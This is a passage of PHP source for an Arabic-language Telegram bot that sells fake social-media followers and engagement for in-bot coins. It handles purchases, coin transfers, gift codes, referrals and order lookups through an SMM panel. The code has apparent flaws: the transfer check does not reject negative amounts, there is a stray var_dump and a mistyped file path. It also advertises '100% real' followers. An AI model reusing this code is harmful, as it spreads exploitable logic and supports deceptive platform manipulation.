  'reply_markup'=>json_encode($RBEROO)
]);

$a3thu["3thu"][] = $from_id ;
file_put_contents("$a3thuFILE",json_encode($a3thu));
$rshq["coin"][str_replace(" ", null, $e1)] += ($rshq["coinshare"]?? "25");
$rshq["mshark"][str_replace(" ", null, $e1)] += 1;
SETJSON($rshq); SETJSON12($modes); 
} else {
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
} 
} else {
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
لايمكنك الدخول لرابط الدعوه الخاص بك ⚠️
  ", 

]);
bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
} 
} else {
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
} 
} 


 
 if($text == "/start"){
  if($hHbero != "I"){
  if($start_sock['mode'] == "✅"){
bot("sendmessage",[
  'chat_id' => $chat_id,
  'text' => $start_msg,
  'parse_mode' => 'MaRKDOWN',
  'reply_to_message_id' => $message_id,
  "reply_markup" => json_encode($key),
]);
  }else{
      bot("sendmessage",[
          'chat_id' => $chat_id,
          'text' => $start_msgmm,
          'parse_mode' => 'MaRKDOWN',
          "reply_markup" => json_encode($key),
      ]);
  }
}
 }
 
 if($data == "buy") {
   if( $rshq['buy'] == null){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
• لشراء رصيد من بوت خدمات $nambot 💡 
      
•︰1$  : 3000 في البوت 
•︰5$  : 15000 في البوت
•︰10$ : 30000 في البوت 
•︰15$ : 45000 في البوت
•︰25$ : 75000 في البوت 
•︰50$ : 150000 في البوت 

• للتواصل مع الوكيل : @YYIYlYl

• ملاحظة: لاتحسب عدد النقاط قليل مقارنة مع البوتات المشهوره لاكن سعر الخدمات رخيص جدا شكرا لتفهمك واستخدامك بوتنا 👑

•︙طرق الدفع المتاحة : 

•︙زين كاش , فودافون كاش , رايزر جولد , اثير , آسياسيل   .
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[

     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
} else {
  $k =  $rshq['buy'];
  bot('EditMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"
   $k
    
    ",
    'parse_mode'=>"markdown",
    'reply_markup'=>json_encode([
         'inline_keyboard'=>[
    
         [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
           
          ]
        ])
    ]);
         }
         }



if($data == "tobot") {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
$starts
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($RBEROO)
]);
$modes['mode'][$from_id] = null ;
SETJSON($rshq) ;
return false ;
} 

$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);
if($data == "hdia") {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
~ ارسل كود النقاط 🎁
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"الغاء ❎",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
    $modes['mode'][$from_id]  = "hdia";
   
    
SETJSON($rshq); SETJSON12($modes);
} 


if($data == "transer") {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
 - تحويل $name3mla ♻️
 - ".$name3mla."ك : $coin 🌀

 - قم باختيار طريقة التحويل  :
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"تحويل عن طريق الأيدي 🆔" ,'callback_data'=>"thoils" ]],
     [['text'=>"تحويل عن طريق الرابط Ⓜ️",'callback_data'=>"linkerm" ]],
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
    $modes['mode'][$from_id]  = $data;
   
    
SETJSON($rshq); SETJSON12($modes);
}

if($data == "thoils") {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
 • ارسل ايدي الشخص لبدا عملية التحويل 🆔
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
    $modes['mode'][$from_id]  = $data;
   
    
SETJSON($rshq); SETJSON12($modes);
}

if(is_numeric($text) and $modes['mode'][$from_id] == "thoils") {
	bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "
 - ارسل الكمية التي تريد تحوليها ♻️
 - يجب ان يكون عدد التحويل 10 فأكثر ⚠️
                    ",
                    'parse_mode' => "markdown",
                    'reply_markup' => json_encode([
                        'inline_keyboard' => [
                            [['text' => "$NamesBACK", 'callback_data' => "tobot"]],
                        ]
                    ])
                ]);
$modes['mode'][$from_id]  = "FGTO|$text" ;
SETJSON($rshq); SETJSON12($modes);
exit ;
	}
	
if(is_numeric($text) and explode("|", $modes['mode'][$from_id])[0] == "FGTO") {
	if($coin >= $text) {
	$fr_id = explode("|", $modes['mode'][$from_id])[1];
	$coin_b = $coin - $text ;
	$coins1 = $rshq["coin"][$fr_id]?? "0";
                $coins2 = $rshq["coin"][$fr_id] + $text;
	bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "
- تم ارسال $text من $name3mla بنجاح ✅

- الى الشخص : $fr_id 👤
- ".$name3mla."ك القديمة : $coin 💎
- ".$name3mla."ك الان : $coin_b 💰
                    ",
                    'parse_mode' => "markdown",
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $fr_id,
                    'text' => "
- تم استلام $text من $name3mla 🔔

- من الشخص : $chat_id 👤
- ".$name3mla."ك القديمة : $coins1 💰
- ".$name3mla."ك الان : $coins2 💎
                    ",
                ]);
                $rshq['coin'][$from_id]  = $coin_b;
                $rshq['coin'][$fr_id]  += $text; 
                $modes['mode'][$from_id]  = null ;
SETJSON($rshq); SETJSON12($modes);
} else {
	bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "
".$name3mla."ك لا تكفي لعملية التحويل ❎
                    ",
                    'parse_mode' => "markdown",
                ]);
                $modes['mode'][$from_id]  = null ;
SETJSON($rshq); SETJSON12($modes);
bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts 
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
	} 
	} 

if($data == "linkerm") {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
 - ملاحظة عمولة التحويل 0 ♻️

 - ارسل كمية ال$name3mla المراد تحويلها 🔃
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
    $modes['mode'][$from_id]  = $data;
   
    
SETJSON($rshq); SETJSON12($modes);
} 
		
		$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);
	
if($text and $modes['mode'][$from_id] == "hdia") {
	if(explode("|", $rshq[$text])[0] == "on") {
		if($rshq['mehdia'][$from_id][$text] !="on" ) {
      if(explode("|", $rshq[$text])[2] >= $rshq["TASY_$text"]){
		bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
تم اضافة ".explode("|", $rshq[$text])[1]." ".$name3mla." الى حسابك ✅
  ", 
  'parse_mode'=>"markdown",
]);
$coij = $modes['mode'][$from_id] + explode("|", $rshq[$text])[1];
bot('sendMessage',[
   'chat_id'=>$admin,
   'text'=>"
 ~ هذا اخذ كود الهديه بقيمه".explode("|", $rshq[$text])[1]."
 
 ~ [$name](tg://user?id=$chat_id) 
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
       
      ]
    ])
]);

$rshq["TASY_$text"] +=1;
$modes['mode'][$from_id] = null;
$rshq['mehdia'][$from_id][$text] = "on" ;
$rshq["coin"][$from_id] += explode("|", $rshq[$text])[1];
SETJSON($rshq); SETJSON12($modes);

bot('sendMessage',[
  'chat_id'=>$chat_id,
  'text'=>"
$starts 
 ", 
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode($RBEROO)
]);
     } else {
      bot('sendMessage',[
        'chat_id'=>$chat_id,
        'text'=>"
الكود خطأ او تم استخدامه ❌
       ", 
       'parse_mode'=>"markdown",
       'reply_markup'=>json_encode([
          'inline_keyboard'=>[
          
          [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
            
            
           ]
         ])
     ]);
     $modes['mode'][$from_id] = null;
SETJSON($rshq); SETJSON12($modes);
     }
} else {
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
الكود خطأ او تم استخدامه ❌
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
       
      ]
    ])
]);
	} 
	} else {
		bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
الكود خطأ او تم استخدامه ❌
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
       
      ]
    ])
]);
$modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
		} 
	}
	
	if(explode("|", $data)[0]== "getNqat"){
	$hSs = explode("|", $data)[1];
	if($rshq['thoiler'][$hSs]["to"] != null) {
		$cvc = $rshq['thoiler'][$hSs]["coin"];
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
 -  تم استرداد $cvc $name3mla الى حسابك ✅

 - الرابط المعطل : https://t.me/[". bot('getme')->result->username. "]?start=Bero$hSs 💹
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
$rshq["coin"][$from_id] += $cvc;
$rshq['thoiler'][$hSs]["to"] = null;
SETJSON($rshq); SETJSON12($modes);
} else {
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
الكود منتهي الصلاحية ⏳❌
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
	} 
	} 



  $tnb=explode('|',$data);
  if($tnb[0] == "dseign"){
    $MakLink=$tnb[1];
    $cok = $rshq['thoiler'][$MakLink]["coin"];
    bot('EditMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
♻️ عدد النقاط ~ $cok ~
🔱 ايدي الشخص الذي حول النقاط ~ `$from_id` ~
♌ يوزر البوت ~ [@". USR_BOT."] ~
🚸 اضغط هنا ليتم تحويل النقاط اليك 👇👇
      ",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode([
           'inline_keyboard'=>[
           [['text'=>"اضغط هنا",'url'=>"https://t.me/". bot('getme')->result->username. "?start=Bero$MakLink"]],
             
            ]
          ])
      ]);
  }

if (is_numeric($text)) {
    if ($modes['mode'][$from_id] == "linkerm") {
        if ($rshq["coin"][$from_id] >= $text) {
            if ($text >= $AKTHAR) {
            	$MakLink = md5(rand(10000, 89999999));
                bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "
• تم خصم $text من نقاطك ✅

- عموله التحويل : 0

• رابط تحويل ال".$name3mla.": 
https://t.me/[". bot('getme')->result->username. "]?start=Bero$MakLink

• ارسل الرابط للشخص المراد تحويل النقاط له 

• الرابط صالح لمده 25 يوم

- يمكنك الضغط على زر تعطيل الرابط لكي تقوم بسترداد نقاطك او قم بدخول على الرابط لاسترداد نقاطك
                    ",
                    'parse_mode' => "markdown",
                    'reply_markup' => json_encode([
                        'inline_keyboard' => [
                          [['text' => "تحويل الي شكل مميز مع زر شفاف ✅", 'callback_data' => "dseign|$MakLink"]],
                            [['text' => "تعطيل الرابط ⚠️", 'callback_data' => "getNqat|$MakLink"]],
                            [['text' => "$NamesBACK", 'callback_data' => "tobot"]],
                        ]
                    ])
                ]);

                $rshq["coin"][$from_id] -= $text;
                $modes['mode'][$from_id] = null;
                $rshq['thoiler'][$MakLink]["coin"] = $text;
                $rshq['thoiler'][$MakLink]["to"] = $from_id;
                SETJSON($rshq); SETJSON12($modes);
            } else {
                bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "يمكنك تحويل $name3mla أكثر من $AKTHAR فقط",
                    'parse_mode' => "markdown",
                    'reply_markup' => json_encode([
                        'inline_keyboard' => [
                            [['text' => "$NamesBACK", 'callback_data' => "tobot"]],
                        ]
                    ])
                ]);
            }
        } else {
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "".$name3mla."ك لا تكفي",
                'parse_mode' => "markdown",
                'reply_markup' => json_encode([
                    'inline_keyboard' => [
                        [['text' => "$NamesBACK", 'callback_data' => "tobot"]],
                    ]
                ])
            ]);
        }
    } 
}

if($data == "plus") {
	if($HDIAS) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
✳️ تجميع $name3mla
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"الانضمام لقنوات 🔊 ",'callback_data'=>"joins|1"]],
      [['text'=>"رابط الدعوه Ⓜ️",'callback_data'=>"linkme"]],
      [['text'=>"$HDIAS",'callback_data'=>"hdiaa"]],
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
} else {
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
✳️ تجميع $name3mla
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"الانضمام لقنوات 🔊",'callback_data'=>"joins|1"]],
      [['text'=>"رابط الدعوه Ⓜ️",'callback_data'=>"linkme"]],
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
	} 
} 

if($rshq['trend'] != "x"){
$BERO = json_decode(file_get_contents("RSHQ/ALLS/".USR_BOT."/BERO.json"),1);
$f= $BERO['BERO']['send']['add'];
rsort($f);
var_dump($f);
for($i=0;$i<5;$i++){
$dets = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$f[$i]"));
$name =$dets->result->title;
if($f[$i] != null){
$V = array_search($f[$i],$BERO['BERO']['send']['add']);
$uS = $BERO['BERO']['send']['uname'][$V];
$u=$i+1;

$Numbers = array(
'1' ,
'2' ,
'3',
'4' ,
'5', 


);
$NumbersBe = array('🥇' ,
'🥈' ,
'🥉' , 
'🏅' , 
'🏅' , 

);

$u = str_replace($Numbers,$NumbersBe,$u);

$dh=bot("getchat",['chat_id'=>$uS])->result->title;
if($dh != null) {
  $fk = $dh;
  } 
  if($dh == null) {
    $fk = $uS;
    } 
$ok = $ok. " $u ★ *$f[$i]* -> [$fk](tg://user?id=$uS) \n";
}
}
}
if($rshq['trend'] != "x"){
$b="🔢] المستخدمين الاكثر مشاركة للرابط : \n$ok" ;
}else{
  $b = null;
}

//الملف كتابه بيرو  @v44vv - @Sero_Bots

if($data == "linkme") {
	$sx = ($rshq["coinshare"]?? "25");
  bot('EditMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$message_id,
  'text'=>"
✳️ تجميع ".$name3mla."

لقد دعوت : $share 👤

عندما تقوم بدعوة شخص من خلال الرابط :
https://t.me/[".bot("getme")->result->username."]?start=$from_id
ستحصل على $sx $name3mla  👤

$b
  ",
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
       'inline_keyboard'=>[
       [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
         
        ]
      ])
  ]);
  } 

  mkdir("HD_P");
$d = date('D');
$day = explode("\n",file_get_contents("HD_P/".$d."_".USR_BOT.".txt"));
if($d == "Sat"){
unlink("HD_P/Fri_$usrbot.txt");
}
if($d == "Sun"){
unlink("HD_P/Sat_".USR_BOT.".txt");
}
if($d == "Mon"){
unlink("HD_P/Sun_".USR_BOT.".txt");
}
if($d == "Tue"){
unlink("MHD_P/on_".USR_BOT.".txt");
}
if($d == "Wed"){
unlink("HD_P/The_".USR_BOT.".txt");
}
if($d == "Thu"){
unlink("HD_P/Wed_".USR_BOT.".txt");
}
if($d == "Fri"){
unlink("HD_P/Thu_".USR_BOT.".txt");
}
  if($data == "hdiaa"){ 
  if(!in_array($from_id, $day)){
    $HDIASs = ($rshq['hdias'] ?? "20");
    bot('answercallbackquery',[
        'callback_query_id'=>$update->callback_query->id,
'text'=>"
✳️] لقد حصلت علي $HDIASs ".$name3mla."
",
 'show_alert'=>true,
]);
$coin = $coin + $HDIASs;
$hour = explode (".",(strtotime('tomorrow') - time()) / (60 * 60))[0];
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
🗃️ الحساب
".$name3mla."ك : $coin $name3mla
ال".$name3mla." المستخدمة : ".($rshq["cointlb"][$from_id] ?? "0")." $name3mla
لقد دعوت : $share ✳️
المتبقي للهدية : $hour ساعة
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"تجميع $name3mla ✳️",'callback_data'=>"plus" ], ['text'=>"$HDIAS",'callback_data'=>"hdiaa" ]],
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
 file_put_contents("HD_P/".$d."_".USR_BOT.".txt",$from_id."\n",FILE_APPEND);
 $rshq["coin"][$from_id] += $HDIASs;
 $rshq= json_encode($rshq,32|128|265);
 file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", $rshq);
	file_put_contents("RSHQ/ALLS/". USR_BOT."/modes.json", json_encode($modes));
}else{
$hour = explode (".",(strtotime('tomorrow') - time()) / (60 * 60))[0];
bot('answercallbackquery',[
        'callback_query_id'=>$update->callback_query->id,
 'text' =>"
طالب بالهدية اليوميه بعد $hour ساعه
 ",
        'show_alert'=>true,
]);
}
}

if($data == "info") {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
البوت الاول في التليجرام لزيادة متابعين الانستقرام بشكل فوري و سريع و بنسبة ثبات 99% 

    كل ماعليك هو دعوة اصدقائك من خلال الرابط الخاص بك وستحصل على متابعين مقابل كل شخص تحصل تدعوه تحصل على 10 $name3mla
    
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
} 

$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/rshq.json"),true);


if($data == "mstqbll") {
	if($rshq['rshqG'] == "on") {
	$ster = "مفتوح ✅" ;
	$wsfer = "يمكنك الرشق ✅" ;
	} else {
		$ster = "مقفل ❌" ;
		$wsfer = "لايمكنك الرشق حاليا اجمع $name3mla لحد ما ينفتح ❌" ;
		} 
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
استقبال الرشق $ster
- $wsfer
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);

} 

# - الملف كتابه بيرو @V44VV) #
# بـيــرو @V44VV - @JJJNTJ 

$e1=str_replace("/start Bero",null,$text); 
if(preg_match('/start Bero/',$text)){
	if($rshq['thoiler'][$e1]["to"] != null) {
		$text = $rshq['thoiler'][$e1]["coin"];
		$tz = $rshq['thoiler'][$e1]["to"] ;
		$coins2 = $coin + $text ;
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
  👤 تم استلام $text من $name3mla بواسطه رابط الدعوه

- من الشخص : $tz
- ".$name3mla."ك القديمة : $coin
- ".$name3mla."ك الان : $coins2
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
bot('sendMessage',[
   'chat_id'=>$rshq['thoiler'][$e1]["to"],
   'text'=>"
   تحويلك مكتمل 👤
   
  لقد استلم :
  الشخص : $chat_id
  العدد : $text من $name3mla
  التحويل عبر الرابط ✅
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
$rshq['thoiler'][$e1]["to"] = null;
$rshq["coin"][$from_id] += $rshq['thoiler'][$e1]["coin"];
SETJSON($rshq); SETJSON12($modes);
} else {
	bot('sendMessage',[
   'chat_id'=>$from_id, 
   'text'=>"
   رابط التحويل هذا غير صالح ❌
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
	} 
} 



if($data == "acc") {
$hour = explode (".",(strtotime('tomorrow') - time()) / (60 * 60))[0];
if(!in_array($from_id, $day)){
	$hour = "تستطيع المطالبة بها 🎁" ;
	} else {
		$hour = explode (".",(strtotime('tomorrow') - time()) / (60 * 60))[0]." ساعة" ;
	} 

  $msg_87 = str_replace(
    array(
      '#name_user',
      '#username',
      '#name',
      '#coinsx',
      '#tlbs',
      '#shares',
      '#xtlb',
      'نقاط',
      
      '#idorder',
      '#type',
      '#count',
      '#timehdia',
  
      '#id',
      '#coins'
    )
    ,
    array(
      "[$name](tg://user?id=$from_id)",
      "[$user_me]",
      $name,
      $rshq["cointlb"][$from_id] ?? "0",
      $rshq['bot_tlb'] ?? "0",
      $rshq["mshark"][$from_id] ?? "0",
      $rshq["tlby"][$from_id] ?? "0",
          $rshq["name3mla"] ?? "نقاط",
  
      $idreq,
      $noe,
      $ala3d,
      $hour,
  
      $from_id,
      $rshq["coin"][$from_id]??"0",
    )
    , $rshq["msgMYACC"]);

    if($rshq["msgMYACC"] == null){
    $ty = "🗃️ الحساب
".$name3mla."ك : $coin $name3mla
ال".$name3mla." المستخدمة : ".($rshq["cointlb"][$from_id] ?? "0")." $name3mla
لقد دعوت : $share ✳️
المتبقي للهدية : $hour 
";
    }else{
      $ty = $msg_87;
    }
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
$ty
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"تجميع $name3mla ✳️",'callback_data'=>"plus" ], ['text'=>"$HDIAS",'callback_data'=>"hdiaa" ]],
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
} 


 if($data == "service") {
 	if($rshq['rshqG'] == "on" ) {

    $key['inline_keyboard'][] = [
      [
          'text' => "انستغرام 🩷 " . ($rshq['taskera']["insta"] ?? "❌"),
          'callback_data' => "assasi_insta"
      ],
      [
          'text' => "تيك توك 🖤 " . ($rshq['taskera']["tik"] ?? "❌"),
          'callback_data' => "assasi_tik"
      ]
  ];
  $key['inline_keyboard'][] = [
      [
          'text' => "تيليغرام 💙 " . ($rshq['taskera']["telegram"] ?? "❌"),
          'callback_data' => "assasi_telegram"
      ]
  ];
  $key['inline_keyboard'][] = [
      [
          'text' => "يوتيوب ❤️ " . ($rshq['taskera']["youtube"] ?? "❌"),
          'callback_data' => "assasi_youtube"
      ],
      [
          'text' => "فيس بوك 🤍 " . ($rshq['taskera']["face"] ?? "❌"),
          'callback_data' => "assasi_face"
      ]
  ];
  $key['inline_keyboard'][] = [
      [
          'text' => "تويتر 💙 " . ($rshq['taskera']["twit"] ?? "❌"),
          'callback_data' => "assasi_twit"
      ],
      [
          'text' => "ثريدز 🖤 " . ($rshq['taskera']["thread"] ?? "❌"),
          'callback_data' => "assasi_thread"
      ]
  ];


  
  $to_face = $rshq['tasker_mcoide']['face'];
  $to_insta = $rshq['tasker_mcoide']['insta'];
  $to_thread = $rshq['tasker_mcoide']['thrad'];
  $to_twit = $rshq['tasker_mcoide']['twit'];
  $to_youtube = $rshq['tasker_mcoide']['youtube'];
  $to_tik = $rshq['tasker_mcoide']['tik'];
  $to_tele = $rshq['tasker_mcoide']['telegram'];
  if($rshq['taskera']["insta"] != ❌){
    $insta = "انستغرام 🩷";
  }
  if($rshq['taskera']["tik"] != ❌){
    $tik = "تيك توك 🖤";
  }
  if($rshq['taskera']["telegram"] != ❌){
    $tele = "تيليغرام 💙";
  }
  if($rshq['taskera']["youtube"] != ❌){
    $yut = "يوتيوب ❤️";
  }
  if($rshq['taskera']["thread"] != ❌){
    $thread = "ثريدز 🖤";
  }
  if($rshq['taskera']["twit"] != ❌){
    $twit = "تويتر 💙";
  }
  if($rshq['taskera']["face"] != ❌){
    $face = "فيس بوك 🤍";
  }
  $key = ['inline_keyboard' => []];
  $key['inline_keyboard'][] = [['text' => "$insta", 'callback_data' => "BEROENT|$to_insta"],['text' => "$tik", 'callback_data' => "BEROENT|$to_tik"]];
  $key['inline_keyboard'][] = [['text' => "$tele", 'callback_data' => "BEROENT|$to_tele"]];
  $key['inline_keyboard'][] = [['text' => "$yut", 'callback_data' => "BEROENT|$to_yut"],['text' => "$face", 'callback_data' => "BEROENT|$to_face"]];
  $key['inline_keyboard'][] = [['text' => "$twit", 'callback_data' => "BEROENT|$to_twit"],['text' => "$thrad", 'callback_data' => "BEROENT|$to_thread"]];
 
    foreach ($rshq['qsm'] as $i) {
      $nameq = explode("-",$i)[0];
      $i = explode("-",$i)[1];
      if(!in_array($i,array($to_face,$to_insta,$to_tele,$to_thread,$to_tik,$to_twit,$to_youtube))){
      if($rshq['IFWORK>'][$i] != "NOT"){
      $key['inline_keyboard'][] = [['text' => "$nameq", 'callback_data' => "BEROENT|$i"]];
    }
  }
}
$key['inline_keyboard'][] = [['text'=>"تمويل تيليكرام اعضاء حقيقيين %100",'callback_data'=>"tmoile"]]; 
    $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "tobot"]];

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
👥] ".$name3mla."ك : $coin
🔢] ايديك : $from_id 
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($key),
]);
} else {
	$key = ['inline_keyboard' => []];
	if($rshq['FREE'] != null) {
	$key['inline_keyboard'][] = [['text'=>"تمويل تيليكرام اعضاء حقيقيين %100",'callback_data'=>"tmoile"]];
	} 
    $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "tobot"]];
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
$stopedkl
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($key)
]);
	} 
} 

if(explode("|",$data)[0]=="BEROENT"){
  $key = ['inline_keyboard' => []];
  $vv = rand(100,900);

  foreach ( $rshq['xdmaxs'][explode("|",$data)[1]] as $hjjj => $i) {

    $key['inline_keyboard'][] = [['text' => "$i", 'callback_data' => "type|".explode("|",$data)[1]."|$hjjj"]];
  }

  $bbERO = explode("|",$data)[1];
  
  $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "service"]];
  bot('EditMessageText', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "
 
    ✳️] اختر الخدمات التي تريدها :
    ",
    'parse_mode' => "markdown",
    'reply_markup' => json_encode($key),
  ]);
  $modes['mode'][$from_id] = null;

  SETJSON($rshq); SETJSON12($modes);
}

if($data == "infotlb") {
 	
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
🔢] ارسل ايدي الطلب :
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'رجوع' ,'callback_data'=>"tobot"]],
]])
]);
    $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
}

$rshq["sSite"] = ($rshq["sites"][$text]??$rshq["sSite"]) ;
$Api_Tok = ($rshq["keys"][$text]?? $rshq["sToken"]) ;
if(is_numeric($text) and $modes['mode'][$from_id] == "infotlb"){
	if($text != null){
		$req = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=status&order=".$text));
$startcc = $req->start_count; //224
$status = $req->remains; 
if($status == "0"){
	$s= "طلب مكتمل 🟢";
	}else{
		$s="قيد المراجعة";
		}
		if($req) {
			if(!$rshq["ordn"][$text]) {
				bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
️هذا الطلب ليس موجود في طلباتك ❌
  ", 
 'parse_mode'=>"markdown",
]);
				$modes['mode'][$from_id]  = null;
SETJSON12($modes);
				exit;
				} 
		bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
   ️⃣] معلومات عن الطلب :

- 🔡] اسم الخدمة : ".$rshq["ordn"][$text]."
- 🔢] ايدي الطلب : `$text`
- ♻️] حالة الطلب : $s
- ⏳] المتبقي : $status
  ", 
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
     'inline_keyboard'=>[
